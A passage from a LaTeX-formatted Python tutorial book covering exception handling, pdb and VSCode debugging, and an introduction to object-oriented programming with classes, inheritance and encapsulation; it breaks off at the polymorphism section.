    \BuiltInTok{print}\NormalTok{(}\StringTok{"Invalid input. Please enter a numeric value."}\NormalTok{)}
\ControlFlowTok{else}\NormalTok{:}
    \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Result: }\SpecialCharTok{\{}\NormalTok{result}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}
\ControlFlowTok{finally}\NormalTok{:}
    \BuiltInTok{print}\NormalTok{(}\StringTok{"This block is always executed."}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\section{Raising Exceptions}\label{raising-exceptions}

You can use the \texttt{raise} statement to generate an exception if a
condition occurs.

\subsection{Example}\label{example-4}

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{def}\NormalTok{ check\_positive(number):}
    \ControlFlowTok{if}\NormalTok{ number }\OperatorTok{\textless{}} \DecValTok{0}\NormalTok{:}
        \ControlFlowTok{raise} \PreprocessorTok{ValueError}\NormalTok{(}\StringTok{"The number must be positive"}\NormalTok{)}
    \ControlFlowTok{return}\NormalTok{ number}

\ControlFlowTok{try}\NormalTok{:}
\NormalTok{    num }\OperatorTok{=}\NormalTok{ check\_positive(}\OperatorTok{{-}}\DecValTok{10}\NormalTok{)}
\ControlFlowTok{except} \PreprocessorTok{ValueError} \ImportTok{as}\NormalTok{ e:}
    \BuiltInTok{print}\NormalTok{(e)}
\end{Highlighting}
\end{Shaded}

\section{Custom Exceptions}\label{custom-exceptions}

You can define custom exceptions by creating a new class that inherits
from the built-in \texttt{Exception} class.

\subsection{Example}\label{example-5}

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{class}\NormalTok{ NegativeNumberError(}\PreprocessorTok{Exception}\NormalTok{):}
    \ControlFlowTok{pass}

\KeywordTok{def}\NormalTok{ check\_positive(number):}
    \ControlFlowTok{if}\NormalTok{ number }\OperatorTok{\textless{}} \DecValTok{0}\NormalTok{:}
        \ControlFlowTok{raise}\NormalTok{ NegativeNumberError(}\StringTok{"The number must be positive"}\NormalTok{)}
    \ControlFlowTok{return}\NormalTok{ number}

\ControlFlowTok{try}\NormalTok{:}
\NormalTok{    num }\OperatorTok{=}\NormalTok{ check\_positive(}\OperatorTok{{-}}\DecValTok{10}\NormalTok{)}
\ControlFlowTok{except}\NormalTok{ NegativeNumberError }\ImportTok{as}\NormalTok{ e:}
    \BuiltInTok{print}\NormalTok{(e)}
\end{Highlighting}
\end{Shaded}

\section{Introduction to Debugging}\label{introduction-to-debugging}

Debugging is the process of identifying and removing errors from your
code. Python provides several tools for debugging, with \texttt{pdb}
(Python Debugger) being one of the most powerful and commonly used.

\section{\texorpdfstring{Using the \texttt{pdb}
Module}{Using the pdb Module}}\label{using-the-pdb-module}

The \texttt{pdb} module allows you to set breakpoints, step through
code, inspect variables, and evaluate expressions at runtime.

\subsection{Basic Usage}\label{basic-usage}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  \textbf{Importing \texttt{pdb}}: You need to import the \texttt{pdb}
  module.
\item
  \textbf{Setting Breakpoints}: Use \texttt{pdb.set\_trace()} to set a
  breakpoint.
\end{enumerate}

\subsection{Example}\label{example-6}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ pdb}

\KeywordTok{def}\NormalTok{ divide(a, b):}
\NormalTok{    pdb.set\_trace()  }\CommentTok{\# Set a breakpoint}
    \ControlFlowTok{return}\NormalTok{ a }\OperatorTok{/}\NormalTok{ b}

\ControlFlowTok{try}\NormalTok{:}
\NormalTok{    result }\OperatorTok{=}\NormalTok{ divide(}\DecValTok{10}\NormalTok{, }\DecValTok{0}\NormalTok{)}
\ControlFlowTok{except} \PreprocessorTok{ZeroDivisionError} \ImportTok{as}\NormalTok{ e:}
    \BuiltInTok{print}\NormalTok{(e)}
\end{Highlighting}
\end{Shaded}

\subsection{\texorpdfstring{Common \texttt{pdb}
Commands}{Common pdb Commands}}\label{common-pdb-commands}

\begin{itemize}
\tightlist
\item
  \texttt{n} (next): Continue to the next line in the current function.
\item
  \texttt{s} (step): Step into the function.
\item
  \texttt{c} (continue): Continue execution until the next breakpoint.
\item
  \texttt{q} (quit): Quit the debugger.
\item
  \texttt{p} (print): Print the value of an expression.
\end{itemize}

\section{Practical Examples}\label{practical-examples}

\subsection{Example 1: File Operations}\label{example-1-file-operations}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ pdb}

\KeywordTok{def}\NormalTok{ read\_file(file\_path):}
\NormalTok{    pdb.set\_trace()}
    \ControlFlowTok{try}\NormalTok{:}
        \ControlFlowTok{with} \BuiltInTok{open}\NormalTok{(file\_path, }\StringTok{\textquotesingle{}r\textquotesingle{}}\NormalTok{) }\ImportTok{as} \BuiltInTok{file}\NormalTok{:}
\NormalTok{            data }\OperatorTok{=} \BuiltInTok{file}\NormalTok{.read()}
            \ControlFlowTok{return}\NormalTok{ data}
    \ControlFlowTok{except} \PreprocessorTok{FileNotFoundError}\NormalTok{:}
        \BuiltInTok{print}\NormalTok{(}\StringTok{"File not found."}\NormalTok{)}
    \ControlFlowTok{except} \PreprocessorTok{IOError}\NormalTok{:}
        \BuiltInTok{print}\NormalTok{(}\StringTok{"Error reading file."}\NormalTok{)}

\NormalTok{file\_content }\OperatorTok{=}\NormalTok{ read\_file(}\StringTok{"non\_existent\_file.txt"}\NormalTok{)}
\BuiltInTok{print}\NormalTok{(file\_content)}
\end{Highlighting}
\end{Shaded}

\subsection{Example 2: Network
Operations}\label{example-2-network-operations}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ requests}
\ImportTok{import}\NormalTok{ pdb}

\KeywordTok{def}\NormalTok{ fetch\_data(url):}
\NormalTok{    pdb.set\_trace()}
    \ControlFlowTok{try}\NormalTok{:}
\NormalTok{        response }\OperatorTok{=}\NormalTok{ requests.get(url)}
\NormalTok{        response.raise\_for\_status()}
        \ControlFlowTok{return}\NormalTok{ response.json()}
    \ControlFlowTok{except}\NormalTok{ requests.exceptions.HTTPError }\ImportTok{as}\NormalTok{ errh:}
        \BuiltInTok{print}\NormalTok{(}\StringTok{"Http Error:"}\NormalTok{, errh)}
    \ControlFlowTok{except}\NormalTok{ requests.exceptions.}\PreprocessorTok{ConnectionError} \ImportTok{as}\NormalTok{ errc:}
        \BuiltInTok{print}\NormalTok{(}\StringTok{"Error Connecting:"}\NormalTok{, errc)}
    \ControlFlowTok{except}\NormalTok{ requests.exceptions.Timeout }\ImportTok{as}\NormalTok{ errt:}
        \BuiltInTok{print}\NormalTok{(}\StringTok{"Timeout Error:"}\NormalTok{, errt)}
    \ControlFlowTok{except}\NormalTok{ requests.exceptions.RequestException }\ImportTok{as}\NormalTok{ err:}
        \BuiltInTok{print}\NormalTok{(}\StringTok{"Something went wrong:"}\NormalTok{, err)}

\NormalTok{data }\OperatorTok{=}\NormalTok{ fetch\_data(}\StringTok{"https://jsonplaceholder.typicode.com/posts/1"}\NormalTok{)}
\BuiltInTok{print}\NormalTok{(data)}
\end{Highlighting}
\end{Shaded}

\section{Best Practices for Error Handling and
Debugging}\label{best-practices-for-error-handling-and-debugging}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  \textbf{Be Specific}: Catch specific exceptions rather than a general
  \texttt{Exception}.
\item
  \textbf{Log Errors}: Use logging to record errors for later analysis.
\item
  \textbf{Use \texttt{finally} Wisely}: Ensure cleanup actions are
  always executed.
\item
  \textbf{Avoid Silent Failures}: Don't suppress exceptions without
  handling them.
\item
  \textbf{Use Debuggers}: Utilize debuggers like \texttt{pdb} to inspect
  and trace code execution.
\item
  \textbf{Validate Inputs}: Always validate inputs to prevent unexpected
  errors.
\item
  \textbf{Test Thoroughly}: Write tests to cover different scenarios and
  edge cases.
\end{enumerate}

\section{Conclusion}\label{conclusion-11}

Error handling and debugging are essential skills for writing robust
Python code. By using \texttt{try}, \texttt{except}, \texttt{else}, and
\texttt{finally} blocks effectively, and leveraging the \texttt{pdb}
module for debugging, you can create more reliable and maintainable
applications. Remember to follow best practices to enhance the quality
and resilience of your code.

\bookmarksetup{startatroot}

\chapter{Deep Dive Tutorial: Using VSCode to Debug Python
Code}\label{deep-dive-tutorial-using-vscode-to-debug-python-code}

Visual Studio Code (VSCode) is a powerful, lightweight code editor
developed by Microsoft. It offers built-in debugging support for various
programming languages, including Python. This tutorial will guide you
through setting up VSCode for debugging Python code, using its robust
debugging features to identify and fix issues efficiently.

\section{Table of Contents}\label{table-of-contents-6}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  \hyperref[setting-up-vscode-for-python-development]{Setting Up VSCode
  for Python Development}
\item
  \hyperref[creating-a-python-project]{Creating a Python Project}
\item
  \hyperref[configuring-the-debugger]{Configuring the Debugger}
\item
  \hyperref[basic-debugging-features]{Basic Debugging Features}
\item
  \hyperref[advanced-debugging-techniques]{Advanced Debugging
  Techniques}
\item
  \hyperref[practical-examples]{Practical Examples}
\item
  \hyperref[best-practices-for-debugging-in-vscode]{Best Practices for
  Debugging in VSCode}
\item
  \hyperref[conclusion]{Conclusion}
\end{enumerate}

\section{Setting Up VSCode for Python
Development}\label{setting-up-vscode-for-python-development}

Before you start debugging Python code in VSCode, you need to set up
your development environment.

\subsection{Install VSCode}\label{install-vscode}

Download and install VSCode from the
\href{https://code.visualstudio.com/}{official website}.

\subsection{Install Python}\label{install-python}

Ensure you have Python installed on your machine. You can download it
from the \href{https://www.python.org/}{official Python website}.

\subsection{Install Python Extension for
VSCode}\label{install-python-extension-for-vscode}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  Open VSCode.
\item
  Go to the Extensions view by clicking the square icon in the sidebar
  or pressing \texttt{Ctrl+Shift+X}.
\item
  Search for ``Python'' and install the extension provided by Microsoft.
\end{enumerate}

\begin{figure}[H]

{\centering \includegraphics{index_files/mediabag/python-extension-vsc.png}

}

\caption{Install Python Extension}

\end{figure}%

\subsection{Verify Installation}\label{verify-installation}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  Open a new terminal in VSCode (\texttt{Ctrl+} `).
\item
  Type \texttt{python\ -\/-version} to verify that Python is installed
  correctly.
\end{enumerate}

\section{Creating a Python Project}\label{creating-a-python-project}

Create a new Python project or open an existing one.

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  Open VSCode.
\item
  Click on ``File'' \textgreater{} ``Open Folder\ldots{}'' and select
  your project directory.
\item
  Create a new Python file by clicking ``File'' \textgreater{} ``New
  File'' and save it with a \texttt{.py} extension (e.g.,
  \texttt{app.py}).
\end{enumerate}

\subsection{Example Code}\label{example-code}

Add some sample Python code to \texttt{app.py}:

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{def}\NormalTok{ divide(a, b):}
    \ControlFlowTok{return}\NormalTok{ a }\OperatorTok{/}\NormalTok{ b}

\KeywordTok{def}\NormalTok{ main():}
    \ControlFlowTok{try}\NormalTok{:}
\NormalTok{        result }\OperatorTok{=}\NormalTok{ divide(}\DecValTok{10}\NormalTok{, }\DecValTok{0}\NormalTok{)}
        \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Result: }\SpecialCharTok{\{}\NormalTok{result}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}
    \ControlFlowTok{except} \PreprocessorTok{ZeroDivisionError} \ImportTok{as}\NormalTok{ e:}
        \BuiltInTok{print}\NormalTok{(}\StringTok{"Error:"}\NormalTok{, e)}

\ControlFlowTok{if} \VariableTok{\_\_name\_\_} \OperatorTok{==} \StringTok{"\_\_main\_\_"}\NormalTok{:}
\NormalTok{    main()}
\end{Highlighting}
\end{Shaded}

\section{Configuring the Debugger}\label{configuring-the-debugger}

Configure the debugger to run your Python code.

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  Click on the Debug icon in the sidebar or press \texttt{Ctrl+Shift+D}.
\item
  Click on ``create a launch.json file'' to customize the debugger.
\end{enumerate}

\subsection{\texorpdfstring{Sample
\texttt{launch.json}}{Sample launch.json}}\label{sample-launch.json}

VSCode will create a \texttt{.vscode} folder in your project directory
with a \texttt{launch.json} file. This file contains configurations for
debugging.

\begin{Shaded}
\begin{Highlighting}[]
\FunctionTok{\{}
    \DataTypeTok{"version"}\FunctionTok{:} \StringTok{"0.2.0"}\FunctionTok{,}
    \DataTypeTok{"configurations"}\FunctionTok{:} \OtherTok{[}
        \FunctionTok{\{}
            \DataTypeTok{"name"}\FunctionTok{:} \StringTok{"Python: Current File"}\FunctionTok{,}
            \DataTypeTok{"type"}\FunctionTok{:} \StringTok{"python"}\FunctionTok{,}
            \DataTypeTok{"request"}\FunctionTok{:} \StringTok{"launch"}\FunctionTok{,}
            \DataTypeTok{"program"}\FunctionTok{:} \StringTok{"$\{file\}"}\FunctionTok{,}
            \DataTypeTok{"console"}\FunctionTok{:} \StringTok{"integratedTerminal"}
        \FunctionTok{\}}
    \OtherTok{]}
\FunctionTok{\}}
\end{Highlighting}
\end{Shaded}

\section{Basic Debugging Features}\label{basic-debugging-features}

\subsection{Setting Breakpoints}\label{setting-breakpoints}

\begin{itemize}
\tightlist
\item
  Click in the gutter (left margin) next to the line numbers to set a
  breakpoint.
\item
  A red dot will appear, indicating the breakpoint.
\end{itemize}

\subsection{Starting the Debugger}\label{starting-the-debugger}

\begin{itemize}
\tightlist
\item
  Press \texttt{F5} to start debugging.
\item
  The debugger will stop at the first breakpoint.
\end{itemize}

\subsection{Debugging Controls}\label{debugging-controls}

\begin{itemize}
\tightlist
\item
  \textbf{Continue (\texttt{F5})}: Resume program execution until the
  next breakpoint.
\item
  \textbf{Step Over (\texttt{F10})}: Execute the current line of code
  and move to the next line.
\item
  \textbf{Step Into (\texttt{F11})}: Step into the function call on the
  current line.
\item
  \textbf{Step Out (\texttt{Shift+F11})}: Step out of the current
  function and return to the caller.
\item
  \textbf{Restart (\texttt{Ctrl+Shift+F5})}: Restart the debugging
  session.
\item
  \textbf{Stop (\texttt{Shift+F5})}: Stop the debugging session.
\end{itemize}

\subsection{Inspecting Variables}\label{inspecting-variables}

\begin{itemize}
\tightlist
\item
  Hover over a variable to see its value.
\item
  Use the ``Variables'' pane to inspect local and global variables.
\end{itemize}

\subsection{Watch Expressions}\label{watch-expressions}

\begin{itemize}
\tightlist
\item
  Add expressions to the ``Watch'' pane to monitor their values as you
  step through the code.
\end{itemize}

\subsection{Call Stack}\label{call-stack}

\begin{itemize}
\tightlist
\item
  The ``Call Stack'' pane shows the stack of function calls leading to
  the current breakpoint.
\end{itemize}

\section{Advanced Debugging
Techniques}\label{advanced-debugging-techniques}

\subsection{Conditional Breakpoints}\label{conditional-breakpoints}

\begin{itemize}
\tightlist
\item
  Right-click on a breakpoint and select ``Edit Breakpoint''.
\item
  Add an expression that must be true for the breakpoint to trigger.
\end{itemize}

\subsection{Log Points}\label{log-points}

\begin{itemize}
\tightlist
\item
  Right-click on a line number and select ``Add Logpoint''.
\item
  Enter a message to log when the line is executed.
\end{itemize}

\subsection{Exception Breakpoints}\label{exception-breakpoints}

\begin{itemize}
\tightlist
\item
  Click on the ``Breakpoints'' pane and add a new exception breakpoint.
\item
  Select the types of exceptions to break on (e.g., all exceptions or
  uncaught exceptions).
\end{itemize}

\subsection{Remote Debugging}\label{remote-debugging}

\begin{itemize}
\tightlist
\item
  Configure VSCode to attach to a remote Python process for debugging.
\item
  Update \texttt{launch.json} with the appropriate ``port'' and ``host''
  settings.
\end{itemize}

\subsection{Debugging Tests}\label{debugging-tests}

\begin{itemize}
\tightlist
\item
  Use the Python extension's built-in support for debugging unit tests.
\item
  Click on the ``Test'' icon in the sidebar and configure your test
  framework.
\end{itemize}

\section{Practical Examples}\label{practical-examples-1}

\subsection{Example 1: Debugging a Web
Scraper}\label{example-1-debugging-a-web-scraper}

Create a simple web scraper using \texttt{requests} and
\texttt{BeautifulSoup}.

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ requests}
\ImportTok{from}\NormalTok{ bs4 }\ImportTok{import}\NormalTok{ BeautifulSoup}

\KeywordTok{def}\NormalTok{ fetch\_data(url):}
\NormalTok{    response }\OperatorTok{=}\NormalTok{ requests.get(url)}
\NormalTok{    response.raise\_for\_status()}
    \ControlFlowTok{return}\NormalTok{ response.text}

\KeywordTok{def}\NormalTok{ parse\_data(html):}
\NormalTok{    soup }\OperatorTok{=}\NormalTok{ BeautifulSoup(html, }\StringTok{\textquotesingle{}html.parser\textquotesingle{}}\NormalTok{)}
\NormalTok{    title }\OperatorTok{=}\NormalTok{ soup.find(}\StringTok{\textquotesingle{}title\textquotesingle{}}\NormalTok{).text}
    \ControlFlowTok{return}\NormalTok{ title}

\KeywordTok{def}\NormalTok{ main():}
    \ControlFlowTok{try}\NormalTok{:}
\NormalTok{        url }\OperatorTok{=} \StringTok{\textquotesingle{}https://example.com\textquotesingle{}}
\NormalTok{        html }\OperatorTok{=}\NormalTok{ fetch\_data(url)}
\NormalTok{        title }\OperatorTok{=}\NormalTok{ parse\_data(html)}
        \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Page Title: }\SpecialCharTok{\{}\NormalTok{title}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}
    \ControlFlowTok{except}\NormalTok{ requests.exceptions.RequestException }\ImportTok{as}\NormalTok{ e:}
        \BuiltInTok{print}\NormalTok{(}\StringTok{"HTTP Error:"}\NormalTok{, e)}

\ControlFlowTok{if} \VariableTok{\_\_name\_\_} \OperatorTok{==} \StringTok{"\_\_main\_\_"}\NormalTok{:}
\NormalTok{    main()}
\end{Highlighting}
\end{Shaded}

Set breakpoints and use the debugger to inspect the \texttt{html} and
\texttt{title} variables.

\subsection{Example 2: Debugging a Data Analysis
Script}\label{example-2-debugging-a-data-analysis-script}

Create a data analysis script using \texttt{pandas}.

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ pandas }\ImportTok{as}\NormalTok{ pd}

\KeywordTok{def}\NormalTok{ load\_data(file\_path):}
\NormalTok{    data }\OperatorTok{=}\NormalTok{ pd.read\_csv(file\_path)}
    \ControlFlowTok{return}\NormalTok{ data}

\KeywordTok{def}\NormalTok{ analyze\_data(data):}
\NormalTok{    summary }\OperatorTok{=}\NormalTok{ data.describe()}
    \ControlFlowTok{return}\NormalTok{ summary}

\KeywordTok{def}\NormalTok{ main():}
    \ControlFlowTok{try}\NormalTok{:}
\NormalTok{        file\_path }\OperatorTok{=} \StringTok{\textquotesingle{}data.csv\textquotesingle{}}
\NormalTok{        data }\OperatorTok{=}\NormalTok{ load\_data(file\_path)}
\NormalTok{        summary }\OperatorTok{=}\NormalTok{ analyze\_data(data)}
        \BuiltInTok{print}\NormalTok{(summary)}
    \ControlFlowTok{except} \PreprocessorTok{FileNotFoundError} \ImportTok{as}\NormalTok{ e:}
        \BuiltInTok{print}\NormalTok{(}\StringTok{"File not found:"}\NormalTok{, e)}

\ControlFlowTok{if} \VariableTok{\_\_name\_\_} \OperatorTok{==} \StringTok{"\_\_main\_\_"}\NormalTok{:}
\NormalTok{    main()}
\end{Highlighting}
\end{Shaded}

Set breakpoints and use the debugger to inspect the \texttt{data} and
\texttt{summary} variables.

\section{Best Practices for Debugging in
VSCode}\label{best-practices-for-debugging-in-vscode}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  \textbf{Use Meaningful Breakpoints}: Set breakpoints at critical
  points in your code to avoid stepping through unnecessary lines.
\item
  \textbf{Leverage Conditional Breakpoints}: Use conditions to trigger
  breakpoints only when specific criteria are met.
\item
  \textbf{Utilize Watch Expressions}: Monitor the values of variables
  and expressions to understand their changes over time.
\item
  \textbf{Inspect the Call Stack}: Use the call stack to trace the
  sequence of function calls leading to the current state.
\item
  \textbf{Log Important Information}: Use log points to output key
  information without modifying your code.
\end{enumerate}

\section{Conclusion}\label{conclusion-12}

VSCode provides a powerful and user-friendly environment for debugging
Python code. By leveraging its debugging features, you can quickly
identify and fix issues, making your development process more efficient
and enjoyable. Follow best practices and use advanced techniques to get
the most out of your debugging sessions. Happy coding!

\bookmarksetup{startatroot}

\chapter{Introduction to Object-Oriented Programming with
Python}\label{introduction-to-object-oriented-programming-with-python}

Object-Oriented Programming (OOP) is a programming paradigm that uses
objects and classes to structure software programs. OOP is centered
around the concept of objects, which are instances of classes. This
tutorial will introduce you to the basics of OOP in Python, including
classes, objects, inheritance, and encapsulation.

\subsection{Basics of Classes and
Objects}\label{basics-of-classes-and-objects}

\subsubsection{Classes}\label{classes}

A class is a blueprint for creating objects. It defines a set of
attributes and methods that the created objects will have.

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{class}\NormalTok{ Employee:}
    \KeywordTok{def} \FunctionTok{\_\_init\_\_}\NormalTok{(}\VariableTok{self}\NormalTok{, name, age, position):}
        \VariableTok{self}\NormalTok{.name }\OperatorTok{=}\NormalTok{ name}
        \VariableTok{self}\NormalTok{.age }\OperatorTok{=}\NormalTok{ age}
        \VariableTok{self}\NormalTok{.position }\OperatorTok{=}\NormalTok{ position}
    
    \KeywordTok{def}\NormalTok{ display\_info(}\VariableTok{self}\NormalTok{):}
        \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Name: }\SpecialCharTok{\{}\VariableTok{self}\SpecialCharTok{.}\NormalTok{name}\SpecialCharTok{\}}\SpecialStringTok{, Age: }\SpecialCharTok{\{}\VariableTok{self}\SpecialCharTok{.}\NormalTok{age}\SpecialCharTok{\}}\SpecialStringTok{, Position: }\SpecialCharTok{\{}\VariableTok{self}\SpecialCharTok{.}\NormalTok{position}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsubsection{Objects}\label{objects}

An object is an instance of a class. It has the properties and behaviors
defined by the class.

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{\# Creating an object of the Employee class}
\NormalTok{employee1 }\OperatorTok{=}\NormalTok{ Employee(}\StringTok{"John Doe"}\NormalTok{, }\DecValTok{30}\NormalTok{, }\StringTok{"Software Engineer"}\NormalTok{)}
\NormalTok{employee1.display\_info()  }\CommentTok{\# Output: Name: John Doe, Age: 30, Position: Software Engineer}
\end{Highlighting}
\end{Shaded}

\subsection{Attributes and Methods}\label{attributes-and-methods}

\subsubsection{Instance Attributes}\label{instance-attributes}

Instance attributes are specific to each object. They are defined within
the \texttt{\_\_init\_\_} method.

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{class}\NormalTok{ Product:}
    \KeywordTok{def} \FunctionTok{\_\_init\_\_}\NormalTok{(}\VariableTok{self}\NormalTok{, name, price, quantity):}
        \VariableTok{self}\NormalTok{.name }\OperatorTok{=}\NormalTok{ name}
        \VariableTok{self}\NormalTok{.price }\OperatorTok{=}\NormalTok{ price}
        \VariableTok{self}\NormalTok{.quantity }\OperatorTok{=}\NormalTok{ quantity}
    
    \KeywordTok{def}\NormalTok{ display\_info(}\VariableTok{self}\NormalTok{):}
        \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Product Name: }\SpecialCharTok{\{}\VariableTok{self}\SpecialCharTok{.}\NormalTok{name}\SpecialCharTok{\}}\SpecialStringTok{, Price: $}\SpecialCharTok{\{}\VariableTok{self}\SpecialCharTok{.}\NormalTok{price}\SpecialCharTok{\}}\SpecialStringTok{, Quantity: }\SpecialCharTok{\{}\VariableTok{self}\SpecialCharTok{.}\NormalTok{quantity}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{\# Creating an object of the Product class}
\NormalTok{product1 }\OperatorTok{=}\NormalTok{ Product(}\StringTok{"Laptop"}\NormalTok{, }\DecValTok{1200}\NormalTok{, }\DecValTok{5}\NormalTok{)}
\NormalTok{product1.display\_info()  }\CommentTok{\# Output: Product Name: Laptop, Price: $1200, Quantity: 5}
\end{Highlighting}
\end{Shaded}

\subsubsection{Class Attributes}\label{class-attributes}

Class attributes are shared by all instances of the class.

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{class}\NormalTok{ Company:}
    \CommentTok{\# Class attribute}
\NormalTok{    company\_name }\OperatorTok{=} \StringTok{"Tech Solutions Inc."}
    
    \KeywordTok{def} \FunctionTok{\_\_init\_\_}\NormalTok{(}\VariableTok{self}\NormalTok{, employee\_name):}
        \VariableTok{self}\NormalTok{.employee\_name }\OperatorTok{=}\NormalTok{ employee\_name}
    
    \KeywordTok{def}\NormalTok{ display\_info(}\VariableTok{self}\NormalTok{):}
        \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Employee: }\SpecialCharTok{\{}\VariableTok{self}\SpecialCharTok{.}\NormalTok{employee\_name}\SpecialCharTok{\}}\SpecialStringTok{, Company: }\SpecialCharTok{\{}\NormalTok{Company}\SpecialCharTok{.}\NormalTok{company\_name}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}

\CommentTok{\# Creating objects of the Company class}
\NormalTok{employee1 }\OperatorTok{=}\NormalTok{ Company(}\StringTok{"Alice"}\NormalTok{)}
\NormalTok{employee2 }\OperatorTok{=}\NormalTok{ Company(}\StringTok{"Bob"}\NormalTok{)}
\NormalTok{employee1.display\_info()  }\CommentTok{\# Output: Employee: Alice, Company: Tech Solutions Inc.}
\NormalTok{employee2.display\_info()  }\CommentTok{\# Output: Employee: Bob, Company: Tech Solutions Inc.}
\end{Highlighting}
\end{Shaded}

\subsection{Inheritance}\label{inheritance}

Inheritance allows a class to inherit attributes and methods from
another class.

\subsubsection{Example: Single
Inheritance}\label{example-single-inheritance}

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{class}\NormalTok{ Person:}
    \KeywordTok{def} \FunctionTok{\_\_init\_\_}\NormalTok{(}\VariableTok{self}\NormalTok{, name, age):}
        \VariableTok{self}\NormalTok{.name }\OperatorTok{=}\NormalTok{ name}
        \VariableTok{self}\NormalTok{.age }\OperatorTok{=}\NormalTok{ age}
    
    \KeywordTok{def}\NormalTok{ display\_info(}\VariableTok{self}\NormalTok{):}
        \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Name: }\SpecialCharTok{\{}\VariableTok{self}\SpecialCharTok{.}\NormalTok{name}\SpecialCharTok{\}}\SpecialStringTok{, Age: }\SpecialCharTok{\{}\VariableTok{self}\SpecialCharTok{.}\NormalTok{age}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}

\CommentTok{\# Employee class inherits from Person class}
\KeywordTok{class}\NormalTok{ Employee(Person):}
    \KeywordTok{def} \FunctionTok{\_\_init\_\_}\NormalTok{(}\VariableTok{self}\NormalTok{, name, age, position):}
        \BuiltInTok{super}\NormalTok{().}\FunctionTok{\_\_init\_\_}\NormalTok{(name, age)}
        \VariableTok{self}\NormalTok{.position }\OperatorTok{=}\NormalTok{ position}
    
    \KeywordTok{def}\NormalTok{ display\_info(}\VariableTok{self}\NormalTok{):}
        \BuiltInTok{super}\NormalTok{().display\_info()}
        \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Position: }\SpecialCharTok{\{}\VariableTok{self}\SpecialCharTok{.}\NormalTok{position}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}

\CommentTok{\# Creating an object of the Employee class}
\NormalTok{employee1 }\OperatorTok{=}\NormalTok{ Employee(}\StringTok{"John Doe"}\NormalTok{, }\DecValTok{30}\NormalTok{, }\StringTok{"Software Engineer"}\NormalTok{)}
\NormalTok{employee1.display\_info()}
\CommentTok{\# Output:}
\CommentTok{\# Name: John Doe, Age: 30}
\CommentTok{\# Position: Software Engineer}
\end{Highlighting}
\end{Shaded}

\subsection{Encapsulation}\label{encapsulation}

Encapsulation is the concept of restricting access to certain attributes
and methods to protect the integrity of the object's data.

\subsubsection{Example: Encapsulation with Private
Attributes}\label{example-encapsulation-with-private-attributes}

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{class}\NormalTok{ BankAccount:}
    \KeywordTok{def} \FunctionTok{\_\_init\_\_}\NormalTok{(}\VariableTok{self}\NormalTok{, account\_number, balance):}
        \VariableTok{self}\NormalTok{.account\_number }\OperatorTok{=}\NormalTok{ account\_number}
        \VariableTok{self}\NormalTok{.\_\_balance }\OperatorTok{=}\NormalTok{ balance  }\CommentTok{\# Private attribute}
    
    \KeywordTok{def}\NormalTok{ deposit(}\VariableTok{self}\NormalTok{, amount):}
        \ControlFlowTok{if}\NormalTok{ amount }\OperatorTok{\textgreater{}} \DecValTok{0}\NormalTok{:}
            \VariableTok{self}\NormalTok{.\_\_balance }\OperatorTok{+=}\NormalTok{ amount}
    
    \KeywordTok{def}\NormalTok{ withdraw(}\VariableTok{self}\NormalTok{, amount):}
        \ControlFlowTok{if} \DecValTok{0} \OperatorTok{\textless{}}\NormalTok{ amount }\OperatorTok{\textless{}=} \VariableTok{self}\NormalTok{.\_\_balance:}
            \VariableTok{self}\NormalTok{.\_\_balance }\OperatorTok{{-}=}\NormalTok{ amount}
    
    \KeywordTok{def}\NormalTok{ get\_balance(}\VariableTok{self}\NormalTok{):}
        \ControlFlowTok{return} \VariableTok{self}\NormalTok{.\_\_balance}

\CommentTok{\# Creating an object of the BankAccount class}
\NormalTok{account }\OperatorTok{=}\NormalTok{ BankAccount(}\StringTok{"12345678"}\NormalTok{, }\DecValTok{1000}\NormalTok{)}
\NormalTok{account.deposit(}\DecValTok{500}\NormalTok{)}
\NormalTok{account.withdraw(}\DecValTok{200}\NormalTok{)}
\BuiltInTok{print}\NormalTok{(account.get\_balance())  }\CommentTok{\# Output: 1300}
\end{Highlighting}
\end{Shaded}

\subsection{Polymorphism}\label{polymorphism}

